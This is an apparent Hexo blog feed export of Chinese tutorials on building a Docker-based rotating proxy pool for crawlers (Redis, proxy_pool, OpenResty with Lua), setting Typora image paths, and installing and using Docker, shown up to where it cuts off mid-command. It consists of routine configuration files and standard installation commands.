        <content type="html"><![CDATA[<blockquote><p>使用 docker 搭建一个隧道代理池<br>docker 的安装看看之前的文章</p></blockquote><h1 id="1-什么是隧道代理池？"><a href="#1-什么是隧道代理池？" class="headerlink" title="1. 什么是隧道代理池？"></a>1. 什么是隧道代理池？</h1><blockquote><p>隧道代理是基于高性能主机构建的动态IP代理服务器；</p><p>以设置固定代理，每次请求自动更换到不同IP *(这里规则可以自己定)*；</p><p>线路以高匿名、高便捷、多并发的优势，适用于个人&#x2F;企业对代理稳定性和品质要求高的客户<em>（主要看你代理池中的 IP 稳不稳定）</em>。<br><img src="/../static/docker-channel-proxy/image-20220429085859252.png" alt="image-20220429085859252"></p></blockquote><h1 id="2-环境准备"><a href="#2-环境准备" class="headerlink" title="2. 环境准备"></a>2. 环境准备</h1><ol><li>服务器一台（最好是公网）</li><li>docker &amp; docker-compose</li><li>以及几个别人弄好的项目代码<ul><li>redis</li><li>openresty</li><li><a href="https://github.com/jhao104/proxy_pool">proxy_pool</a></li></ul></li></ol><h1 id="3-开始搭建"><a href="#3-开始搭建" class="headerlink" title="3. 开始搭建"></a>3. 开始搭建</h1><h3 id="1-搭建-redis"><a href="#1-搭建-redis" class="headerlink" title="1. 搭建 redis"></a>1. 搭建 redis</h3><ul><li><p>在服务器某个角落创建一个文件夹叫 <strong>docker-redis（自己看着取名）</strong> 在到文件夹下创建一个文件叫做 <strong>docker-compose.yml</strong></p></li><li><p>内容如下：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">redis</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> redis    <span class="token key atrule">image</span><span class="token punctuation">:</span> docker.io/bitnami/redis<span class="token punctuation">:</span><span class="token number">6.2</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> REDIS_PASSWORD=xxxx(自己设置密码)      <span class="token punctuation">-</span> REDIS_DISABLE_COMMANDS=FLUSHDB<span class="token punctuation">,</span>FLUSHALL    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">'6379(端口自己也可以改改):6379'</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">'./data:/bitnami/redis/data'</span>    <span class="token key atrule">command</span><span class="token punctuation">:</span> /opt/bitnami/scripts/redis/run.sh <span class="token punctuation">-</span><span class="token punctuation">-</span>appendonly yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建完了直接 <code>docker-compose up -d</code> 一步启动~</p></li><li><p>查看有没有报错可以 <code>docker-compose logs -f</code></p></li><li><p>对就是这么简单， 对了，还有记一下你服务器的 <strong>IP</strong> 和 <strong>端口</strong> 以及自己设置的 <strong>密码</strong></p></li></ul><h3 id="2-搭建代理池"><a href="#2-搭建代理池" class="headerlink" title="2. 搭建代理池"></a>2. 搭建代理池</h3><ul><li><p>还是一样在服务器某个角落创建一个文件文件夹叫 <strong>docker-pool</strong></p></li><li><p>然后把这个项目  👉👉👉 <a href="https://github.com/jhao104/proxy_pool">proxy_pool</a> 弄进去 </p></li><li><p>我们一般用 <code>git clone https://github.com/jhao104/proxy_pool.git</code></p></li><li><p>改动几个文件</p></li></ul><ol><li><p>setting.py</p><ul><li><strong>DB_CONN</strong> 改成自己的redis</li><li><strong>TABLE_NAME</strong> 改成 <code>proxy:pool</code> 后面有用到</li><li>文件差不多就是这样了<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>VERSION <span class="token operator">=</span> <span class="token string">"2.4.0"</span>BANNER <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""******************************************************************* ______  ********************* ______ *********** _  *********** | ___ \_ ******************** | ___ \ ********* | | *********** | |_/ / \__ __   __  _ __   _ | |_/ /___ * ___  | | *********** |  __/|  _// _ \ \ \/ /| | | ||  __// _ \ / _ \ | | *********** | |   | | | (_) | >  &lt; \ |_| || |  | (_) | (_) || |___  ******* \_|   |_|  \___/ /_/\_\ \__  |\_|   \___/ \___/ \_____/ ********                       __ / /                          ****************************** /___ / ********************************************************       ************************************************************************************************"""</span>HOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>PORT <span class="token operator">=</span> <span class="token number">5010</span><span class="token comment"># db connection uri</span><span class="token comment"># example:</span><span class="token comment">#      Redis: redis://:password@ip:port/db</span><span class="token comment">#      Ssdb:  ssdb://:password@ip:port</span>DB_CONN <span class="token operator">=</span> <span class="token string">'redis://:xxx(密码)@111.111.222.222(IP):6379(端口)/0'</span>  <span class="token comment"># 👈👈👈</span><span class="token comment"># proxy table name</span>TABLE_NAME <span class="token operator">=</span> <span class="token string">'proxy:pool'</span> <span class="token comment"># 👈👈👈</span><span class="token comment"># ###### config the proxy fetch function ######</span>PROXY_FETCHER <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"freeProxy01"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy02"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy03"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy04"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy05"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy06"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy07"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy08"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy09"</span><span class="token punctuation">,</span>    <span class="token string">"freeProxy10"</span><span class="token punctuation">]</span><span class="token comment"># 代理验证目标网站</span>HTTP_URL <span class="token operator">=</span> <span class="token string">"http://demo.spiderpy.cn"</span>HTTPS_URL <span class="token operator">=</span> <span class="token string">"https://www.qq.com"</span><span class="token comment"># 代理验证时超时时间</span>VERIFY_TIMEOUT <span class="token operator">=</span> <span class="token number">10</span><span class="token comment"># 近PROXY_CHECK_COUNT次校验中允许的最大失败次数,超过则剔除代理</span>MAX_FAIL_COUNT <span class="token operator">=</span> <span class="token number">0</span><span class="token comment"># proxyCheck时代理数量少于POOL_SIZE_MIN触发抓取</span>POOL_SIZE_MIN <span class="token operator">=</span> <span class="token number">20</span>TIMEZONE <span class="token operator">=</span> <span class="token string">"Asia/Shanghai"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>Dockerfile</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> python:3.6-alpine</span><span class="token instruction"><span class="token keyword">MAINTAINER</span> jhao104 &lt;j_hao104@163.com></span><span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span><span class="token instruction"><span class="token keyword">COPY</span> ./requirements.txt .</span><span class="token comment"># apk repository</span><span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">'s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g'</span> /etc/apk/repositories</span><span class="token comment"># timezone</span><span class="token instruction"><span class="token keyword">RUN</span> apk add -U tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; apk del tzdata</span><span class="token comment"># runtime environment</span><span class="token instruction"><span class="token keyword">RUN</span> apk add musl-dev gcc libxml2-dev libxslt-dev &amp;&amp; <span class="token operator">\</span>    pip install --no-cache-dir -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple/ &amp;&amp; <span class="token operator">\</span>    apk del gcc musl-dev</span><span class="token instruction"><span class="token keyword">COPY</span> . .</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 5010 # 👈👈👈 其实这行可以去掉， 他是对外提供管理代理池的，我们做成隧道代理用处不是很大</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [ <span class="token string">"sh"</span>, <span class="token string">"start.sh"</span> ]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>start.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/env bash</span><span class="token comment">#之前是启动了两个服务现在我们只要调度器启动就可以了</span><span class="token comment">#python proxyPool.py server &amp; python proxyPool.py schedule</span>python proxyPool.py schedule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>同目录下自己创建一个 <strong>docker-compose.yml</strong></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">proxy_pool</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> proxy_pool    <span class="token comment"># 👇👇👇 端口这个地方也是可要可不要的</span>    <span class="token key atrule">ports</span><span class="token punctuation">:</span>       <span class="token punctuation">-</span> <span class="token string">"5010:5010"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token comment">#和 setting.py 里面的 DB_CONN 一样</span>      <span class="token key atrule">DB_CONN</span><span class="token punctuation">:</span> <span class="token string">"redis://xxx"</span>    <span class="token comment"># 可能你以后需要自己加代理, 可以直接改当前项目省得每次改动都重新 build 镜像</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">'./:/app'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ul><li><p>创建完了直接 <code>docker-compose up -d</code> 一步启动~</p></li><li><p>查看有没有报错可以 <code>docker-compose logs -f</code></p></li></ul><h3 id="3-搭建-openresty"><a href="#3-搭建-openresty" class="headerlink" title="3. 搭建 openresty"></a>3. 搭建 openresty</h3><ul><li><p>还是一样在服务器某个角落创建一个文件文件夹叫 <strong>docker-openresty（自己看着取名）</strong> </p></li><li><p>创建一个 <strong>Dockerfile</strong></p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> openresty/openresty</span><span class="token instruction"><span class="token keyword">COPY</span> conf/nginx.conf /usr/local/openresty/nginx/conf/nginx.conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>创建一个 <strong>conf</strong> 文件夹，和 <strong>nginx.conf</strong></p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">worker_processes</span>  <span class="token number">16</span></span><span class="token punctuation">;</span>        <span class="token comment">#nginx worker 数量</span><span class="token directive"><span class="token keyword">error_log</span> /usr/local/openresty/nginx/logs/error.log</span><span class="token punctuation">;</span>   <span class="token comment">#指定错误日志文件路径</span><span class="token directive"><span class="token keyword">events</span></span> <span class="token punctuation">&#123;</span>    <span class="token directive"><span class="token keyword">worker_connections</span> <span class="token number">1024</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token directive"><span class="token keyword">stream</span></span> <span class="token punctuation">&#123;</span>    <span class="token comment">## TCP 代理日志格式定义</span>    <span class="token directive"><span class="token keyword">log_format</span> tcp_proxy <span class="token string">'<span class="token variable">$remote_addr</span> [<span class="token variable">$time_local]</span> '</span>                         <span class="token string">'<span class="token variable">$protocol</span> <span class="token variable">$status</span> <span class="token variable">$bytes_sent</span> <span class="token variable">$bytes_received</span> '</span>                         <span class="token string">'<span class="token variable">$session_time</span> "<span class="token variable">$upstream_addr</span>" '</span>                         <span class="token string">'"<span class="token variable">$upstream_bytes_sent</span>" "<span class="token variable">$upstream_bytes_received</span>" "<span class="token variable">$upstream_connect_time</span>"'</span></span><span class="token punctuation">;</span>    <span class="token comment">## TCP 代理日志配置</span>    <span class="token directive"><span class="token keyword">access_log</span> /usr/local/openresty/nginx/logs/access.log tcp_proxy</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">open_log_file_cache</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span>    <span class="token comment">## TCP 代理配置</span>    <span class="token directive"><span class="token keyword">upstream</span> backend</span><span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">server</span> 127.0.0.2:1101</span><span class="token punctuation">;</span><span class="token comment"># 爱写啥写啥  反正下面的代码也给你改了</span>        <span class="token directive"><span class="token keyword">balancer_by_lua_block</span></span> <span class="token punctuation">&#123;</span>            -- 初始化balancer            local balancer = require "ngx.balancer"            local host = ""            local port = 0            host = ngx.ctx.proxy_host            port = ngx.ctx.proxy_port            -- 设置 balancer            local ok, err = balancer.set_current_peer(host, port)            if not ok then                ngx.log(ngx.ERR, "failed to set the peer: ", err)            end        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">preread_by_lua_block</span></span><span class="token punctuation">&#123;</span>            <span class="token directive"><span class="token keyword">local</span> redis = require(<span class="token string">"resty.redis"</span>)            --创建实例            local redis_instance = redis:new()            --设置超时（毫秒）            redis_instance:set_timeout(3000)            --建立连接,请在这里配置Redis 的 IP 地址、端口号、密码和用到的 Key            local rhost = <span class="token string">"111.222.111.222"</span> -- 👈👈👈 redis IP地址            local rport = <span class="token number">6379</span> -- 👈👈👈 redis 端口            local rpass = <span class="token string">"xxxx"</span> -- 👈👈👈 密码自己设置            local rkey = <span class="token string">"proxy:pool"</span> -- 👈👈👈 跟你前面那个setting.py；里面的 TABLE_NAME 对好            local ok, err = redis_instance:connect(rhost, rport)            -- ngx.log(ngx.ERR, <span class="token string">"connect redis: "</span>, ok, <span class="token string">" "</span>, err)            -- 如果没有密码，移除下面这一行            local res, err = redis_instance:auth(rpass)            local res, err = redis_instance:hkeys(rkey)            if not res then                ngx.log(ngx.ERR,<span class="token string">"res num error : "</span>, err)                return redis_instance:close()            end            math.randomseed(tostring(ngx.now()):reverse():sub(1, 6))            local proxy = res[math.random(#res)]            local colon_index = string.find(proxy, <span class="token string">":"</span>)            local proxy_ip = string.sub(proxy, 1, colon_index - 1)            local proxy_port = string.sub(proxy, colon_index + 1)            ngx.log(ngx.ERR,<span class="token string">"redis data = "</span>, proxy_ip, <span class="token string">":"</span>, proxy_port)</span><span class="token punctuation">;</span>            ngx.ctx.proxy_host = proxy_ip            ngx.ctx.proxy_port = proxy_port            redis_instance:close()        <span class="token punctuation">&#125;</span>       <span class="token comment"># 下面是本机的端口，也就是爬虫固定写死的端口</span>       <span class="token comment"># 监听本机地址和端口，当使用keeplived的情况下使用keeplived VIP</span>       <span class="token directive"><span class="token keyword">listen</span> 0.0.0.0:6666</span><span class="token punctuation">;</span> <span class="token comment"># 👈👈👈 这里可以不改</span>       <span class="token directive"><span class="token keyword">proxy_connect_timeout</span> <span class="token number">3s</span></span><span class="token punctuation">;</span>       <span class="token directive"><span class="token keyword">proxy_timeout</span> <span class="token number">10s</span></span><span class="token punctuation">;</span>       <span class="token directive"><span class="token keyword">proxy_pass</span> backend</span><span class="token punctuation">;</span> <span class="token comment">#这里填写对端的地址</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>再创建一个文件叫做 <strong>docker-compose.yml</strong> </p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">openresty</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> openresty    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token comment"># 端口自己配置，后面这个端口要和上面文件 listen 对应，前面的是宿主机映射的端口也就是最后我们代理地方填的端口</span>      <span class="token punctuation">-</span> <span class="token string">"5555:6666"</span> <span class="token comment"># 👈👈👈 这里的 6666 可以不改， 5555 改成你想设置的</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> TZ=Asia/Shanghai    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./conf<span class="token punctuation">:</span>/usr/local/openresty/nginx/conf <span class="token comment"># 方便你随时调整</span>      <span class="token punctuation">-</span> ./logs<span class="token punctuation">:</span>/usr/local/openresty/nginx/logs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建完了直接 <code>docker-compose up -d</code> 一步启动~</p></li><li><p>都启动完了可以看看成果<br><img src="/../static/docker-channel-proxy/image-20220429094908921.png" alt="image-20220429094908921"></p></li><li><p>这里给个可视化免费的 redis 工具 👉👉👉 <a href="https://github.com/qishibo/AnotherRedisDesktopManager">戳这里</a> 👈👈👈</p></li><li><p>随时查看你的代理池里面剩余的东西<br><img src="/../static/docker-channel-proxy/image-20220429100022518.png" alt="image-20220429100022518"></p></li></ul><h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h1><ul><li><a href="https://github.com/qishibo/AnotherRedisDesktopManager">https://github.com/qishibo/AnotherRedisDesktopManager</a></li><li><a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></li><li><a href="https://juejin.cn/post/6988289418637344782">https://juejin.cn/post/6988289418637344782</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> crawler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Typora插入图片</title>
      <link href="/image/"/>
      <url>/image/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Typora插入图片"><a href="#使用Typora插入图片" class="headerlink" title="使用Typora插入图片"></a>使用Typora插入图片</h1><h3 id="1-配置博客"><a href="#1-配置博客" class="headerlink" title="1. 配置博客"></a>1. 配置博客</h3><ul><li>新建一个页面命名为 <em>static</em> ，命令：<code>hexo new page static</code></li></ul><p><img src="/../static/image/image-20221110105300266.png" alt="image-20221110105300266"></p><p>然后将 <code>index.md</code> 写成 <code>404</code> 的页面，（😅其实写什么无所谓，反正用不上）</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> Not Found<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2022-11-09 14:29:48</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">description</span><span class="token punctuation">:</span> <span class="token string">"Not Found"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-配置Typora"><a href="#2-配置Typora" class="headerlink" title="2. 配置Typora"></a>2. 配置<strong>Typora</strong></h3><ol><li>找到 <code>文件 -&gt; 偏好设置 -&gt; 图像</code> 设置成复制到指定路径，路径填 <code>../static/$&#123;filename&#125;/</code></li></ol><p><img src="/../static/image/image-20221110105646036.png" alt="image-20221110105646036"></p><h3 id="3-记录一下特殊图片"><a href="#3-记录一下特殊图片" class="headerlink" title="3. 记录一下特殊图片"></a>3. 记录一下特殊图片</h3><ul><li>最小的透明图片</li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="mini"></p><ul><li>最小的黑色图片</li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=" alt="mini"></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装和使用</title>
      <link href="/docker/"/>
      <url>/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="docker安装和使用"><a href="#docker安装和使用" class="headerlink" title="docker安装和使用"></a>docker安装和使用</h1><h2 id="1-安装Docker"><a href="#1-安装Docker" class="headerlink" title="1. 安装Docker"></a>1. 安装Docker</h2><h3 id="1-1-Debian-amp-Ubuntu安装Docker"><a href="#1-1-Debian-amp-Ubuntu安装Docker" class="headerlink" title="1.1 Debian&amp;Ubuntu安装Docker"></a>1.1 Debian&amp;Ubuntu安装Docker</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 卸载之前安装的docker</span><span class="token function">sudo</span> <span class="token function">apt-get</span> remove <span class="token function">docker</span> docker-engine docker.io containerd runc<span class="token comment"># 2. 更新 apt 包索引</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token comment"># 3. 安装 apt 依赖包，用于通过HTTPS来获取仓库:</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token punctuation">\</span>    apt-transport-https <span class="token punctuation">\</span>    ca-certificates <span class="token punctuation">\</span>    <span class="token function">curl</span> <span class="token punctuation">\</span>    gnupg-agent <span class="token punctuation">\</span>    software-properties-common<span class="token comment"># 4. 添加 Docker 的官方 GPG 密钥：</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://download.docker.com/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span class="token comment"># 5. 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88\</span><span class="token comment"># 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥。</span><span class="token function">sudo</span> apt-key fingerprint 0EBFCD88<span class="token comment"># 6. 使用以下指令设置稳定版仓库</span><span class="token function">sudo</span> add-apt-repository <span class="token punctuation">\</span>   <span class="token string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu \  <span class="token variable"><span class="token variable">$(</span>lsb_release <span class="token parameter variable">-cs</span><span class="token variable">)</span></span> stable"</span><span class="token comment"># 7. 安装Docker Engine-Community</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker-ce docker-ce-cli containerd.io <span class="token parameter variable">-y</span><span class="token comment"># 8. 测试 Docker 是否安装成功</span><span class="token function">docker</span> <span class="token parameter variable">-v</span><span class="token comment"># 9. 成功之后启动 docker 服务</span>/etc/init.d/docker start <span class="token comment"># 或者</span><span class="token function">service</span> <span class="token function">docker</span> start<span class="token comment"># 10. 如果想开机启动：</span><span class="token function">sudo</span> update-rc.d  <span class="token function">docker</span> <span class="token builtin class-name">enable</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-Centos安装Docker"><a href="#1-2-Centos安装Docker" class="headerlink" title="1.2 Centos安装Docker"></a>1.2 Centos安装Docker</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 更新一下源信息</span><span class="token function">sudo</span> yum update<span class="token comment"># 安装一下修改源的依赖</span><span class="token function">sudo</span> yum <span class="token function">install</span> yum-utils device-mapper-persistent-data lvm2 <span class="token parameter variable">-y</span><span class="token comment"># 修改安装docker的源</span><span class="token function">sudo</span> yum-config-manager  --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token comment"># 开始安装docker</span><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce <span class="token parameter variable">-y</span><span class="token comment">#安装完了验证是否完成安装</span><span class="token function">docker</span> <span class="token parameter variable">-v</span><span class="token comment"># 启动docker服务</span>systemctl start <span class="token function">docker</span><span class="token comment"># 关闭docker服务</span>systemctl stop <span class="token function">docker</span><span class="token comment"># 查看状态</span>systemctl status <span class="token function">docker</span><span class="token comment"># 开机启动</span>systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    </p><h2 id="2-使用ustc的docker镜像"><a href="#2-使用ustc的docker镜像" class="headerlink" title="2. 使用ustc的docker镜像"></a>2. 使用ustc的docker镜像</h2><ul><li><p>这是镜像地址<br><a href="http://mirrors.ustc.edu.cn/">http://mirrors.ustc.edu.cn/</a></p></li><li><p>配置docker镜像地址</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/docker/daemon.json <span class="token comment"># 打开的是一个新文件</span><span class="token comment"># 写入：</span><span class="token punctuation">&#123;</span> <span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>保存退出即可</p></li></ul><h2 id="3-docker镜像管理相关命令"><a href="#3-docker镜像管理相关命令" class="headerlink" title="3. docker镜像管理相关命令"></a>3. docker镜像管理相关命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查找镜像 </span><span class="token function">docker</span> search <span class="token operator">&lt;</span>name<span class="token operator">></span><span class="token comment">#下载镜像 </span><span class="token function">docker</span> pull <span class="token operator">&lt;</span>name<span class="token operator">></span><span class="token comment">#列出镜像 </span><span class="token function">docker</span> image <span class="token function">ls</span> <span class="token operator">|</span> images<span class="token comment">#删除镜像 </span><span class="token function">docker</span> image <span class="token function">rm</span> <span class="token operator">&lt;</span>name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-docker容器管理相关命令"><a href="#4-docker容器管理相关命令" class="headerlink" title="4. docker容器管理相关命令"></a>4. docker容器管理相关命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#运行容器 </span><span class="token function">docker</span> run <span class="token parameter variable">-it</span> centos /bin/bash<span class="token comment">#后台运行 </span><span class="token function">docker</span> run <span class="token parameter variable">-d</span> centos /bin/bash<span class="token comment">#列出容器 </span><span class="token function">docker</span> container <span class="token function">ls</span> 或者 <span class="token function">docker</span> <span class="token function">ps</span><span class="token comment">#启动容器 </span><span class="token function">docker</span> start <span class="token operator">&lt;</span>CONTAINER ID<span class="token operator">></span><span class="token comment">#终止容器 </span><span class="token function">docker</span> stop <span class="token operator">&lt;</span>CONTAINER ID<span class="token operator">></span><span class="token comment">#进入容器 </span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> <span class="token operator">&lt;</span>CONTAINER ID<span class="token operator">></span> <span class="token function">bash</span><span class="token comment">#导入导出 </span><span class="token function">docker</span> <span class="token builtin class-name">export</span> <span class="token operator">&lt;</span>IMAGE ID<span class="token operator">></span> <span class="token operator">></span> ubuntu.tar<span class="token function">cat</span> ubuntu.tar <span class="token operator">|</span> <span class="token function">docker</span> <span class="token function">import</span> - test/ubuntu:v1.0<span class="token function">docker</span> <span class="token function">import</span> http://example.com/exampleimage.tgz example/imagerepo<span class="token comment">#删除容器</span>ocker container <span class="token function">rm</span> <span class="token operator">&lt;</span>CONTAINER ID<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-安装-docker-compose"><a href="#5-安装-docker-compose" class="headerlink" title="5. 安装 docker-compose"></a>5. 安装 docker-compose</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载可执行文件</span><span class="token function">sudo</span> <span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token string">"https://github.com/docker/compose/releases/download/v2.2.2/docker-compose-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> <span class="token parameter 